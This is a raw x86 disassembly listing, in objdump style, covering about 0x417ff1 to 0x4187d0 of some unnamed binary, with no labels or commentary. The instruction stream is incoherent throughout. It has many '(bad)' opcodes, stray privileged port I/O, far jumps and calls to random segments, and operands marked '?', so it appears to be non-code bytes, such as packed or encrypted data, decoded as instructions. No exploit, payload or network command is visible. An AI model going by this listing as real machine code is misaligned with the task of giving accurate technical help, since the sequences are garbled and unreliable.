  417ff1:	cwde   
  417ff2:	aad    0x42
  417ff4:	je     0x417fa0
  417ff6:	into   
  417ff7:	call   0x88dc0b39
  417ffc:	add    edx,ebx
  417ffe:	inc    eax
  417fff:	fcomp  DWORD PTR [ebx+ecx*8-0x5f]
  418003:	(bad)  
  418004:	call   0x5ed6d49
  418009:	cmp    ebx,DWORD PTR [edx-0x7bcd0af0]
  41800f:	adc    BYTE PTR [ebx+0x5d],al
  418012:	jb     0x418056
  418014:	lock add DWORD PTR [eax],esi
  418017:	and    al,0x1e
  418019:	xchg   DWORD PTR [eax],ebp
  41801b:	and    dl,BYTE PTR [esi]
  41801d:	test   DWORD PTR [ecx+0x38],0x5dfca983
  418024:	xchg   BYTE PTR [eax],bl
  418026:	adc    dl,al
  418028:	mov    ebp,0xe278f9d8
  41802d:	pop    edx
  41802e:	ins    BYTE PTR es:[edi],dx
  41802f:	call   0x3f69:0x5edcc879
  418036:	mov    al,ds:0xa3ac9bd9
  41803b:	mov    ah,dl
  41803d:	les    ecx,FWORD PTR [esi-0x49e5111]
  418043:	rol    DWORD PTR [esi-0x36380a00],1
  418049:	shl    eax,1
  41804b:	pop    ss
  41804c:	mov    WORD PTR [edi+0x798f783d],?
  418052:	fdiv   QWORD PTR [esi+0x5f]
  418055:	xchg   edx,eax
  418056:	sub    DWORD PTR [eax-0x21296b2c],esp
  41805c:	gs mov ch,0xbe
  41805f:	stos   DWORD PTR es:[edi],eax
  418060:	std    
  418061:	add    al,0xc5
  418063:	fwait
  418064:	dec    ebx
  418065:	dec    edi
  418066:	cmp    ch,ah
  418068:	sub    BYTE PTR [edi+ebp*2+0x5adc1f31],bl
  41806f:	xlat   BYTE PTR ds:[ebx]
  418070:	dec    edx
  418071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418072:	repnz sbb edi,DWORD PTR [edi-0x4ac0be1a]
  418079:	push   eax
  41807a:	mov    ah,0x11
  41807c:	and    DWORD PTR [edx+0x151acb2d],eax
  418082:	(bad)
  418086:	pop    edi
  418087:	cmp    DWORD PTR [ecx+0x5],0xffffff90
  41808b:	push   0xffffff9a
  41808d:	xchg   esp,eax
  41808e:	pop    edi
  41808f:	cld    
  418090:	pop    eax
  418091:	dec    edi
  418092:	dec    edx
  418093:	dec    esp
  418094:	pop    eax
  418095:	mov    dh,0x15
  418097:	xchg   esp,eax
  418098:	mov    dh,0xd9
  41809a:	addr16 jg 0x418115
  41809d:	cmp    BYTE PTR [ebp-0x16134c75],ah
  4180a3:	jge    0x41806f
  4180a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180a6:	outs   dx,DWORD PTR ds:[esi]
  4180a7:	and    bl,BYTE PTR [eax+0x1f79f067]
  4180ad:	out    0x23,eax
  4180af:	sub    al,0xf1
  4180b1:	xor    al,0xe0
  4180b4:	mov    ebp,0x8eddef42
  4180b9:	fldcw  WORD PTR [esi+edx*1-0x26]
  4180bd:	dec    edi
  4180be:	jmp    0x19ed:0x7fce08c4
  4180c5:	jmp    0xf939:0x4fb60629
  4180cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180cd:	mov    dl,0x33
  4180cf:	or     BYTE PTR [edi-0x39c88f3e],0x96
  4180d6:	in     al,0xbb
  4180d8:	stos   BYTE PTR es:[edi],al
  4180d9:	mov    bh,0x44
  4180db:	pop    esp
  4180dc:	data16 loope 0x418070
  4180df:	loope  0x418152
  4180e1:	and    bl,ch
  4180e3:	popf   
  4180e4:	daa    
  4180e5:	xor    eax,0x3c598415
  4180ea:	xchg   DWORD PTR [ebp-0x15],ecx
  4180ed:	(bad)  
  4180ee:	cld    
  4180ef:	xor    cl,BYTE PTR [ebx]
  4180f1:	call   0x8d8cbb5f
  4180f6:	in     eax,dx
  4180f7:	pop    esi
  4180f8:	call   0xc111:0xbe5c3e6c
  4180ff:	fwait
  418100:	cmovle ecx,DWORD PTR [edi+0x32]
  418104:	test   al,0xbe
  418106:	imul   ebp,DWORD PTR [esp+esi*8],0x7d16dc7c
  41810d:	addr16 ds test eax,0xeec07ab4
  418114:	shr    BYTE PTR [ebp+0x4d8480f3],1
  41811a:	xor    eax,0xadd4789
  41811f:	push   eax
  418120:	sub    edx,ecx
  418122:	sbb    BYTE PTR [ebx-0x63],bl
  418125:	dec    eax
  418126:	mov    edx,0x499bfc9a
  41812b:	clc    
  41812c:	mov    DWORD PTR [ebp+0x73],esp
  41812f:	or     DWORD PTR [edi],edx
  418131:	(bad)  
  418132:	pop    esi
  418133:	mov    eax,0xee684dc2
  418138:	mov    cl,0x10
  41813a:	jmp    0x4181ba
  41813c:	jmp    0xf39f:0xd9e0441c
  418143:	(bad)  
  418144:	jmp    0x418109
  418146:	addr16 mov ecx,0xbb077b07
  41814c:	pop    ecx
  41814d:	je     0x418162
  41814f:	and    ch,bl
  418151:	fdivr  DWORD PTR [edi+edx*8-0x232dd257]
  418158:	es cld 
  41815a:	jl     0x418159
  41815c:	test   BYTE PTR [ebp-0x3a],al
  41815f:	push   edi
  418160:	jne    0x41810d
  418162:	cmp    eax,0x8aa66e7b
  418167:	cmp    eax,ecx
  418169:	add    bh,ch
  41816b:	jl     0x418116
  41816d:	cli    
  41816e:	in     eax,0xab
  418170:	or     DWORD PTR [esi+ebp*4],ecx
  418173:	push   ebp
  418174:	xor    al,0x59
  418176:	dec    esp
  418177:	jecxz  0x4181cb
  418179:	cmp    DWORD PTR [edi+ebp*1],0x61478ef0
  418180:	xor    BYTE PTR [esi+edi*4],0x98
  418184:	call   0xb503:0xd99aa234
  41818b:	into   
  41818c:	psadbw mm2,QWORD PTR [edi]
  41818f:	loopne 0x4181c0
  418191:	pop    edx
  418192:	mov    eax,0x8b3ab2b2
  418197:	jne    0x4181a5
  418199:	xor    ecx,eax
  41819b:	xor    esi,eax
  41819d:	lea    ecx,[esi+ecx*1+0x327298]
  4181a4:	xor    ecx,eax
  4181a6:	jmp    0x4184c0
  4181ab:	sar    BYTE PTR [esi],0xce
  4181ae:	xlat   BYTE PTR ds:[ebx]
  4181af:	(bad)  
  4181b0:	xlat   BYTE PTR ds:[ebx]
  4181b1:	(bad)
  4181b4:	loope  0x41818c
  4181b6:	pop    esp
  4181b7:	adc    dl,dl
  4181b9:	xchg   ebp,eax
  4181ba:	das    
  4181bb:	sbb    DWORD PTR [edi+edi*2],esi
  4181be:	js     0x41823b
  4181c0:	jle    0x41823a
  4181c2:	js     0x41821b
  4181c4:	mov    dh,0x7f
  4181c6:	cmp    DWORD PTR [edx-0x46],ebp
  4181c9:	ins    BYTE PTR es:[edi],dx
  4181ca:	call   0x2b7c:0xd3e5dda
  4181d1:	mov    al,ds:0x278b7a4d
  4181d6:	fild   WORD PTR [eax-0x60655312]
  4181dc:	retf   0xeb92
  4181df:	aas    
  4181e0:	scas   al,BYTE PTR es:[edi]
  4181e1:	dec    BYTE PTR [ebx-0x1e]
  4181e4:	ret    0x8b3a
  4181e7:	cmp    BYTE PTR [eax],dh
  4181e9:	dec    eax
  4181ea:	jo     0x4181df
  4181ec:	sbb    dl,0xe7
  4181ef:	fcomi  st,st(3)
  4181f1:	cli    
  4181f2:	dec    ebp
  4181f3:	ins    DWORD PTR es:[edi],dx
  4181f4:	push   ds
  4181f5:	inc    eax
  4181f6:	and    al,0xf4
  4181f8:	pushf  
  4181f9:	cmp    dl,BYTE PTR [ecx-0x33a130c7]
  4181ff:	shl    DWORD PTR [ecx],1
  418201:	popa   
  418202:	mov    ebx,DWORD PTR [esi-0xf]
  418205:	arpl   sp,bp
  418207:	xchg   BYTE PTR [ebp+0x3a],al
  41820a:	or     BYTE PTR [edi+0x7b],0xb2
  41820e:	jg     0x41821d
  418210:	mov    cs,ecx
  418212:	(bad)  
  418213:	xchg   ebx,eax
  418214:	icebp  
  418215:	test   eax,0x187b4669
  41821a:	prefetch BYTE PTR [ebx-0x16]
  41821e:	sti    
  41821f:	jbe    0x41821c
  418221:	fst    QWORD PTR [eax-0x61459a33]
  418227:	push   ebp
  418228:	sub    cl,0xb6
  41822b:	fwait
  41822c:	jmp    0xba1b58f
  418231:	shl    BYTE PTR [ebp+0x5d],cl
  418234:	sar    BYTE PTR [ecx+0x10],cl
  418237:	xchg   esi,eax
  418238:	test   eax,0x196d885c
  41823d:	minps  xmm7,XMMWORD PTR ss:0x4d219eed
  418245:	fnsave [esi+0x26]
  418248:	inc    eax
  418249:	jns    0x4181f2
  41824b:	cmp    eax,ebp
  41824d:	ror    ebp,1
  41824f:	pop    edi
  418250:	gs xchg edx,eax
  418252:	rcr    ch,0x8a
  418255:	dec    edx
  418256:	fisttp WORD PTR [esi+0x3f]
  418259:	out    0x52,eax
  41825b:	jmp    0x41825a
  41825d:	dec    esi
  41825e:	sti    
  41825f:	out    0x13,al
  418261:	mov    ah,0xd9
  418263:	inc    ebx
  418264:	pop    esp
  418265:	push   es
  418266:	int    0x8e
  418268:	inc    edx
  418269:	inc    edi
  41826a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41826b:	sbb    al,0x80
  41826d:	adc    edx,esi
  41826f:	mov    eax,0x55093de5
  418274:	lea    ebp,[eax]
  418276:	mov    dl,0xa0
  418278:	add    eax,ebx
  41827a:	loop   0x4182e7
  41827c:	std    
  41827d:	nop
  41827e:	icebp  
  41827f:	popa   
  418280:	mov    ds:0x3aeac017,eax
  418285:	shl    BYTE PTR [ebp+0x3],1
  418288:	dec    edi
  418289:	cmp    al,0x30
  41828b:	jg     0x41830b
  41828d:	dec    ecx
  41828e:	and    eax,0xede33e89
  418293:	xchg   esi,eax
  418294:	retf   0xc5cc
  418297:	popa   
  418298:	mov    eax,ds:0x44bd0183
  41829d:	fdiv   QWORD PTR [esi+0x6050e7d]
  4182a4:	jo     0x418260
  4182a6:	mov    ebx,0x421e3a45
  4182ab:	mov    esp,0xf4f61178
  4182b0:	shl    ebx,1
  4182b2:	loopne 0x4182e0
  4182b4:	retf   0x5097
  4182b7:	lods   eax,DWORD PTR ds:[esi]
  4182b8:	mov    dl,0x21
  4182ba:	push   es
  4182bb:	sbb    cl,BYTE PTR [esi+0x39]
  4182be:	and    BYTE PTR [edx-0x1c901883],ch
  4182c4:	inc    ecx
  4182c5:	mov    ch,0xdc
  4182c7:	rol    ebp,0x88
  4182ca:	das    
  4182cb:	daa    
  4182cc:	enter  0xd1a0,0xb9
  4182d0:	cs call 0xa83d30b0
  4182d6:	xchg   edi,eax
  4182d7:	loope  0x418329
  4182d9:	sahf   
  4182da:	push   ds
  4182db:	adc    BYTE PTR [edx+0x55a280f9],al
  4182e1:	(bad)  
  4182e2:	mov    bl,BYTE PTR [edx-0x4e092a9a]
  4182e8:	stos   BYTE PTR es:[edi],al
  4182e9:	dec    edx
  4182ea:	in     al,dx
  4182eb:	js     0x418331
  4182ed:	idiv   ebx
  4182ef:	fwait
  4182f0:	loope  0x4182c4
  4182f2:	out    0xc,eax
  4182f4:	push   cs
  4182f5:	loope  0x4182f5
  4182f7:	jns    0x41829b
  4182f9:	sahf   
  4182fa:	jmp    0x88d9e0f6
  4182ff:	xchg   esi,eax
  418300:	mov    ds,WORD PTR [eax]
  418302:	add    bl,BYTE PTR [esi]
  418304:	cld    
  418305:	cld    
  418306:	fs call 0xace13d32
  41830c:	jecxz  0x418374
  41830e:	sbb    al,0xa7
  418310:	in     eax,0x5f
  418312:	xor    BYTE PTR [ebx-0x3d],dh
  418315:	xor    eax,0xffffff86
  418318:	cmp    DWORD PTR [edx+0x52ac5ecf],0x4f
  41831f:	mov    dl,0x37
  418321:	sub    dh,BYTE PTR [eax]
  418323:	pop    ds
  418324:	(bad)  
  418325:	mov    ebx,0x27d5ea8d
  41832a:	(bad)  
  41832b:	sbb    eax,0xfed5d3bc
  418330:	xchg   ebx,eax
  418331:	push   ecx
  418332:	out    dx,eax
  418333:	pop    edi
  418334:	xor    ah,BYTE PTR ds:0x7e01a2b6
  41833a:	retf   
  41833b:	mov    esp,0xd27b0ef2
  418340:	jge    0x4182eb
  418342:	scas   al,BYTE PTR es:[edi]
  418343:	mov    edx,0x34406720
  418348:	inc    esi
  418349:	dec    DWORD PTR [esi]
  41834b:	cmp    edx,0x61158c9b
  418351:	sub    ebx,DWORD PTR [esi+ecx*2]
  418354:	hlt    
  418355:	jge    0x4182f8
  418357:	dec    eax
  418358:	push   cs
  418359:	mov    ch,0xdd
  41835b:	mov    DWORD PTR [eax-0x4cdf7d4f],ebp
  418361:	pushf  
  418362:	imul   DWORD PTR [esi]
  418364:	into   
  418365:	xchg   esp,eax
  418366:	int3   
  418367:	int3   
  418368:	ss js  0x418398
  41836b:	int3   
  41836c:	fld    st(2)
  41836e:	cmc    
  41836f:	pop    esp
  418370:	loopne 0x4182fe
  418372:	int    0x4f
  418374:	jmp    0x7047:0xc85dc280
  41837b:	add    esi,DWORD PTR [edx-0x2090f9e1]
  418381:	or     al,0x73
  418383:	cmp    DWORD PTR [esi+0x190f91e0],edi
  418389:	mov    edi,0xdf9a438e
  41838e:	(bad)  
  41838f:	jne    0x41838c
  418391:	dec    esi
  418392:	dec    ebx
  418393:	xchg   ebx,eax
  418394:	mov    edx,0xbf4d14e4
  418399:	(bad)  
  41839a:	jmp    0x1ade:0x29d38d27
  4183a1:	xchg   esp,eax
  4183a2:	shr    DWORD PTR [edi],1
  4183a4:	sub    BYTE PTR [eax+edx*8+0x3b],0x19
  4183a9:	outs   dx,DWORD PTR ds:[esi]
  4183aa:	lahf   
  4183ab:	cwde   
  4183ac:	scas   al,BYTE PTR es:[edi]
  4183ad:	and    eax,0x4ec640d5
  4183b2:	out    0xf7,al
  4183b4:	call   0xcdb4:0xd2197902
  4183bb:	xor    eax,0x828076d8
  4183c0:	adc    eax,ebx
  4183c2:	jns    0x41838d
  4183c4:	fs pop ss
  4183c6:	dec    eax
  4183c7:	xchg   esi,eax
  4183c8:	jecxz  0x418418
  4183ca:	push   0x44
  4183cc:	pop    edi
  4183cd:	xchg   edx,eax
  4183ce:	jnp    0x41844d
  4183d0:	pop    ebp
  4183d1:	loopne 0x4183d2
  4183d3:	(bad)  
  4183d4:	mov    ds:0xa747c411,al
  4183d9:	ins    DWORD PTR es:[edi],dx
  4183da:	or     BYTE PTR [edi-0x4d],cl
  4183dd:	stos   BYTE PTR es:[edi],al
  4183de:	mov    cl,ch
  4183e0:	dec    edx
  4183e1:	(bad)  
  4183e2:	daa    
  4183e3:	add    eax,0x3622782a
  4183e8:	and    al,0xbe
  4183ea:	pop    ebp
  4183eb:	jo     0x4183d0
  4183ed:	in     al,dx
  4183ee:	mov    al,0xf2
  4183f0:	int3   
  4183f1:	fistp  DWORD PTR [edx]
  4183f3:	mov    ebp,0x3f7f2c37
  4183f8:	pop    eax
  4183f9:	xchg   esp,eax
  4183fa:	xchg   edx,eax
  4183fb:	aam    0xc7
  4183fd:	push   0xffffffb8
  4183ff:	ret    0x7b57
  418402:	ja     0x41845a
  418404:	mov    ds:0xbc4e5cf8,eax
  418409:	mov    ebp,0xda336688
  41840e:	dec    edx
  41840f:	cwde   
  418410:	fbld   TBYTE PTR [eax-0x20]
  418413:	mov    bh,0x2d
  418415:	aas    
  418416:	xchg   DWORD PTR [ebp+eiz*2+0x5936baf5],edi
  41841d:	loop   0x41840d
  41841f:	mov    cl,0x47
  418421:	mov    edi,0x1b7a4d17
  418426:	loopne 0x41848c
  418428:	in     eax,dx
  418429:	mov    esi,0x44458d15
  41842e:	daa    
  41842f:	cwde   
  418430:	loopne 0x4183e2
  418432:	clc    
  418433:	fs pop edi
  418435:	test   BYTE PTR [edx+0xc2e86fc],bh
  41843b:	dec    BYTE PTR [edx]
  41843d:	rcl    BYTE PTR [esi+0x1f0550dd],cl
  418443:	adc    BYTE PTR [ecx+0x8d7e05a],dh
  418449:	xchg   edx,eax
  41844a:	and    BYTE PTR [edx-0xba172ff],0x84
  418451:	fs popa 
  418453:	lock sub DWORD PTR [eax],0xfffffff3
  418457:	mov    eax,esi
  418459:	and    al,0xea
  41845b:	icebp  
  41845c:	pop    edi
  41845d:	test   BYTE PTR [ebx+ecx*2+0x1e],ah
  418461:	mov    edi,0x8d7e4a90
  418466:	sahf   
  418467:	push   edx
  418468:	push   0xe41bf2ae
  41846d:	stos   DWORD PTR es:[edi],eax
  41846e:	or     ah,al
  418470:	mul    bh
  418472:	add    al,0x46
  418474:	enter  0xd686,0xab
  418478:	or     DWORD PTR [esi],esi
  41847a:	pop    esi
  41847b:	fmul   DWORD PTR [ebp+0x6]
  41847e:	test   DWORD PTR [ecx+0x3c],ebx
  418481:	js     0x41840c
  418483:	scas   al,BYTE PTR es:[edi]
  418484:	icebp  
  418485:	mov    esi,0x759e3965
  41848a:	push   edi
  41848b:	xchg   esi,eax
  41848c:	push   es
  41848d:	push   ss
  41848e:	xor    al,0x7d
  418490:	sub    eax,ecx
  418492:	arpl   WORD PTR [edx-0x73],ax
  418495:	mov    es,WORD PTR [edi+0x3e]
  418498:	mov    al,0x21
  41849a:	inc    ebp
  41849b:	dec    esi
  41849c:	aas    
  41849d:	or     eax,0x1d67386e
  4184a2:	(bad)  
  4184a3:	jno    0x9222aa3d
  4184a9:	js     0x4184a8
  4184ab:	sub    dl,ch
  4184ad:	add    ch,bl
  4184af:	or     eax,DWORD PTR [ecx]
  4184b1:	int3   
  4184b2:	dec    esp
  4184b3:	retf   0xa00b
  4184b6:	push   edx
  4184b7:	mov    DWORD PTR ds:0x75b65154,0x81d18880
  4184c1:	stc    
  4184c2:	sub    BYTE PTR [ebp-0x7af00764],al
  4184c8:	inc    esi
  4184c9:	stc    
  4184ca:	(bad)  
  4184cb:	(bad)  
  4184cc:	jmp    0x418819
  4184d1:	jmp    0x4187eb
  4184d6:	int3   
  4184d7:	les    edi,FWORD PTR [edi+ecx*8]
  4184da:	aam    0xd7
  4184dc:	ror    ebx,cl
  4184de:	mov    esi,0x92ec6d48
  4184e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184e4:	aam    0x87
  4184e6:	adc    al,0x39
  4184e8:	jg     0x418562
  4184ea:	jnp    0x41856a
  4184ec:	js     0x418566
  4184ee:	jge    0x4184b0
  4184f0:	data16 xor ch,al
  4184f3:	cmc    
  4184f4:	repz (bad) 
  4184f6:	mov    cs,ecx
  4184f8:	ins    DWORD PTR es:[edi],dx
  4184f9:	jmp    0x6a6c:0xb5e3b1c3
  418500:	js     0x4184da
  418502:	jg     0x4184ca
  418504:	cdq    
  418505:	fiadd  WORD PTR [eax+0x17]
  418508:	inc    ecx
  418509:	cli    
  41850a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41850b:	mov    ah,0x5c
  41850d:	jnp    0x4184db
  41850f:	out    0x5d,al
  418511:	and    dl,BYTE PTR [ecx-0x32]
  418514:	aam    0x19
  418516:	cli    
  418517:	lods   al,BYTE PTR ds:[esi]
  418518:	push   es
  418519:	add    eax,0x5c40e5a
  41851e:	jo     0x418564
  418520:	cmp    DWORD PTR [edx-0x6b],0xffffffe4
  418524:	or     ah,BYTE PTR [esi+0x6d]
  418527:	pop    es
  418528:	das    
  418529:	pop    ecx
  41852a:	sbb    eax,0x5adf5bf
  41852f:	push   esp
  418530:	mov    al,0x5f
  418532:	mov    bh,0xb2
  418534:	jmp    0x41857a
  418536:	mov    ?,WORD PTR ds:0x4afa5d13
  41853c:	inc    eax
  41853d:	stc    
  41853e:	in     al,0x9d
  418540:	jbe    0x4184e0
  418542:	xor    ah,cl
  418544:	sbb    DWORD PTR [esi-0x1d6a1ee3],eax
  41854a:	cmp    edx,DWORD PTR ss:[edi-0x1d9aff1]
  418551:	les    edi,FWORD PTR [ecx+0x79]
  418554:	mov    edi,0x3e8ffd4f
  418559:	(bad)  
  41855a:	popf   
  41855b:	pop    edx
  41855c:	loopne 0x41852d
  41855e:	ror    DWORD PTR [edi+0x76054ade],1
  418564:	cld    
  418565:	add    DWORD PTR [ecx-0x11bcd5ea],edi
  41856b:	and    al,0xd4
  41856d:	lods   eax,DWORD PTR ds:[esi]
  41856e:	push   eax
  41856f:	inc    eax
  418570:	add    DWORD PTR [edi-0x50],eax
  418573:	mov    ebp,0x127606db
  418578:	and    ch,al
  41857a:	outs   dx,DWORD PTR ds:[esi]
  41857b:	das    
  41857c:	scas   al,BYTE PTR es:[edi]
  41857d:	ja     0x4185b2
  41857f:	outs   dx,BYTE PTR ds:[esi]
  418580:	add    BYTE PTR ds:0xb26c106d,bl
  418586:	inc    ebx
  418587:	retf   
  418588:	inc    edi
  418589:	mov    eax,0x16aec368
  41858e:	rcr    DWORD PTR [ecx],0x91
  418591:	out    0xa0,al
  418593:	adc    esp,DWORD PTR [edx+0x19]
  418596:	cdq    
  418597:	pop    edx
  418598:	or     BYTE PTR [edx+0x534adb31],ch
  41859e:	test   DWORD PTR [eax],ebx
  4185a0:	pop    esp
  4185a1:	jo     0x4185ff
  4185a3:	loopne 0x4185af
  4185a5:	(bad)  
  4185a7:	jae    0x418562
  4185a9:	adc    eax,ebx
  4185ab:	and    eax,DWORD PTR [ebx]
  4185ad:	mov    al,ds:0xfe96bf08
  4185b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185b3:	daa    
  4185b4:	aad    0xd2
  4185b6:	mov    ebp,0x7a73cdb
  4185bb:	dec    eax
  4185bc:	sub    ebx,DWORD PTR [ebx]
  4185be:	dec    ecx
  4185bf:	pop    ebx
  4185c0:	test   BYTE PTR [edx],0x24
  4185c3:	clc    
  4185c4:	popa   
  4185c5:	jnp    0x418635
  4185c7:	jp     0x4185d5
  4185c9:	outs   dx,DWORD PTR cs:[esi]
  4185cb:	sbb    eax,0xccf5f916
  4185d0:	push   0x65
  4185d2:	mov    bl,BYTE PTR ds:0x42dfd4c0
  4185d8:	arpl   WORD PTR [eax+ebp*1],bp
  4185db:	loop   0x4185a4
  4185dd:	dec    eax
  4185de:	mov    BYTE PTR [ecx+0x3d],cl
  4185e1:	test   eax,0xd1e529d2
  4185e6:	dec    eax
  4185e7:	ret    0xdc57
  4185ea:	leave  
  4185eb:	ret    0x1bd5
  4185ee:	shr    BYTE PTR [esi+0x3a88896a],0xb5
  4185f5:	jge    0x418620
  4185f7:	nop
  4185f8:	outs   dx,BYTE PTR ds:[esi]
  4185f9:	aam    0x65
  4185fb:	xor    eax,0xa1af2203
  418600:	dec    ebp
  418601:	ins    BYTE PTR es:[edi],dx
  418602:	sti    
  418603:	(bad)  
  418604:	pop    ecx
  418605:	into   
  418606:	push   eax
  418607:	ja     0x4185a9
  418609:	xor    edi,ebx
  41860b:	leave  
  41860c:	repz pop edx
  41860e:	jb     0x418666
  418610:	mov    ebp,gs
  418612:	adc    BYTE PTR [edx-0xcedde3d],ch
  418618:	fdivr  DWORD PTR [esi]
  41861a:	cmp    DWORD PTR [edi],edx
  41861c:	cmp    DWORD PTR [ebp+ebp*4-0x4a640ed4],eax
  418623:	xchg   edi,eax
  418624:	or     dl,BYTE PTR [ecx]
  418626:	popa   
  418627:	and    al,0x30
  418629:	fdivrp st(4),st
  41862b:	jne    0x418641
  41862d:	ja     0x418693
  41862f:	pushf  
  418630:	fsub   DWORD PTR [edi-0x21]
  418633:	mov    dh,0xef
  418635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418636:	arpl   WORD PTR [ebx+eax*1],di
  418639:	lea    ebp,[eax-0xe]
  41863c:	jg     0x4185c5
  41863e:	mov    WORD PTR [ebp+0x67],?
  418641:	leave  
  418642:	lods   al,BYTE PTR ds:[esi]
  418643:	sbb    bl,BYTE PTR [esi]
  418645:	xchg   edi,eax
  418646:	and    al,0x6e
  418648:	mov    edi,0xf2bf240
  41864d:	add    al,0x69
  41864f:	pop    esi
  418650:	cs cli 
  418652:	jmp    0x418644
  418654:	loopne 0x418625
  418656:	pop    edx
  418657:	je     0x418605
  418659:	inc    ebp
  41865a:	jnp    0x4185f0
  41865c:	pop    esi
  41865d:	xchg   BYTE PTR [esi+0x6c],ch
  418660:	outs   dx,DWORD PTR ds:[esi]
  418661:	inc    edi
  418662:	fdiv   DWORD PTR [edi-0x4050a2e5]
  418668:	iret   
  418669:	add    esi,edx
  41866b:	jns    0x4185fa
  41866d:	mov    esp,0x8902b536
  418672:	shl    DWORD PTR [esi],cl
  418674:	(bad)  
  418675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418676:	ror    BYTE PTR [esi],cl
  418678:	cs xchg ecx,eax
  41867a:	scas   al,BYTE PTR es:[edi]
  41867b:	leave  
  41867c:	inc    edx
  41867d:	ins    DWORD PTR es:[edi],dx
  41867e:	js     0x4186c4
  418680:	fwait
  418681:	aaa    
  418682:	push   ebp
  418683:	inc    ebp
  418684:	cli    
  418685:	mov    ch,0xc3
  418687:	mov    es,WORD PTR [ebx]
  418689:	mov    ds:0x713f370b,eax
  41868e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41868f:	call   FWORD PTR [ebp+esi*8+0x2d]
  418693:	cmp    esp,DWORD PTR [ebx]
  418695:	sti    
  418696:	jl     0x418643
  418698:	lock (bad) 
  41869a:	mov    edi,0xf320dcbf
  41869f:	gs iret 
  4186a1:	xor    eax,0xe6efb279
  4186a6:	jae    0x41867a
  4186a8:	ret    0xbfe5
  4186ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186ac:	fstp   DWORD PTR [edx]
  4186ae:	sar    ebx,1
  4186b0:	mov    eax,ds:0xa16e48d
  4186b5:	sub    DWORD PTR [ebp-0x72c48670],ebx
  4186bb:	mov    ecx,0x5d829d8f
  4186c0:	ror    al,1
  4186c2:	mov    es,WORD PTR fs:[esi+0xd]
  4186c6:	jne    0x41871c
  4186c8:	test   eax,0x629472d0
  4186cd:	retf   0x3046
  4186d0:	dec    edi
  4186d1:	daa    
  4186d2:	pop    ds
  4186d3:	repnz lds edx,FWORD PTR [edx+ebx*1+0x1552276]
  4186db:	mov    cs,ecx
  4186dd:	cmp    al,0x2e
  4186df:	xchg   ebx,eax
  4186e0:	push   ebp
  4186e1:	and    edi,DWORD PTR [ecx+0x30d686f2]
  4186e7:	dec    eax
  4186e8:	sbb    edi,DWORD PTR [ebp+0x5e]
  4186eb:	jmp    0x4186f5
  4186ed:	xchg   ecx,eax
  4186ee:	out    dx,eax
  4186ef:	mov    dh,0x30
  4186f1:	cwde   
  4186f2:	mov    cl,0x4c
  4186f4:	pop    es
  4186f5:	mov    ebp,0x1115fe3
  4186fa:	mov    eax,ds:0x5ca95190
  4186ff:	and    eax,0xc1e02db7
  418704:	(bad)  
  418705:	ja     0x418733
  418707:	pop    ss
  418708:	mov    edi,0x1c78e1da
  41870d:	popf   
  41870e:	sar    DWORD PTR [edi-0x19],0x50
  418712:	sti    
  418713:	adc    eax,DWORD PTR ds:0xfdfad648
  418719:	addr16 test ch,0x6c
  41871d:	mov    al,0xe3
  41871f:	push   edx
  418720:	test   al,0xac
  418722:	fdiv   st(2),st
  418724:	cmp    dl,0x39
  418727:	in     eax,0xa6
  418729:	(bad)  
  41872a:	push   ebp
  41872b:	add    ebp,DWORD PTR ds:0x20b74d7b
  418731:	push   cs
  418732:	push   esp
  418733:	data16 and BYTE PTR [eax+0x3f],ah
  418737:	push   eax
  418738:	xchg   ecx,eax
  418739:	jnp    0x4187a8
  41873b:	rcr    DWORD PTR [esp+edi*4],0xdb
  41873f:	shl    BYTE PTR [ebp+ebx*1+0x30],0x65
  418744:	adc    eax,0xd65a487c
  418749:	inc    edi
  41874a:	popf   
  41874b:	pop    ss
  41874c:	sbb    BYTE PTR [edi-0x50f1dab1],dl
  418752:	popf   
  418753:	js     0x41878f
  418755:	aad    0xcf
  418757:	(bad)  
  418758:	push   eax
  418759:	out    0x94,al
  41875b:	cmp    eax,0x2d9a20e9
  418760:	mov    edx,0xfc7d9a7
  418765:	lods   eax,DWORD PTR ds:[esi]
  418766:	mov    dh,BYTE PTR [ecx+0x51]
  418769:	cmp    BYTE PTR [ebp+esi*1-0x4faa12d4],cl
  418770:	and    DWORD PTR [ecx-0xa234cf],esi
  418776:	pop    ebp
  418777:	(bad)  
  418778:	ss jmp 0x4187f1
  41877b:	out    0x9e,al
  41877d:	inc    ebp
  41877e:	test   eax,0x3cbf550
  418783:	pushf  
  418784:	lods   eax,DWORD PTR ds:[esi]
  418785:	dec    eax
  418786:	hlt    
  418787:	js     0x4187be
  418789:	in     al,dx
  41878a:	push   eax
  41878b:	push   0xffffffcf
  41878d:	out    dx,al
  41878e:	retf   0x4f3a
  418791:	sti    
  418792:	push   es
  418793:	xor    edx,DWORD PTR [ecx+0x54758580]
  418799:	cli    
  41879a:	inc    edi
  41879b:	or     DWORD PTR [ebx+0x58],esp
  41879e:	mov    ch,0xdf
  4187a0:	cmp    DWORD PTR [ecx+0x24],edi
  4187a3:	xor    ecx,ebx
  4187a5:	push   ebx
  4187a6:	stos   DWORD PTR es:[edi],eax
  4187a7:	push   ebx
  4187a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187a9:	xlat   BYTE PTR ds:[ebx]
  4187aa:	xchg   ebx,eax
  4187ab:	mov    cl,0xb3
  4187ad:	pop    es
  4187ae:	add    al,0x20
  4187b0:	cdq    
  4187b1:	lds    ecx,FWORD PTR [ebp+ebp*8+0x50019742]
  4187b8:	pop    edi
  4187b9:	dec    esp
  4187ba:	mov    eax,0xc9f22167
  4187bf:	out    dx,eax
  4187c0:	daa    
  4187c1:	ret    
  4187c2:	stos   BYTE PTR es:[edi],al
  4187c3:	xor    dh,BYTE PTR [edi+0x32563740]
  4187c9:	sbb    al,cl
  4187cb:	into   
  4187cc:	inc    ebx
  4187cd:	iret   
  4187ce:	repnz daa 
  4187d0:	outs   dx,BYTE PTR ds:[esi]
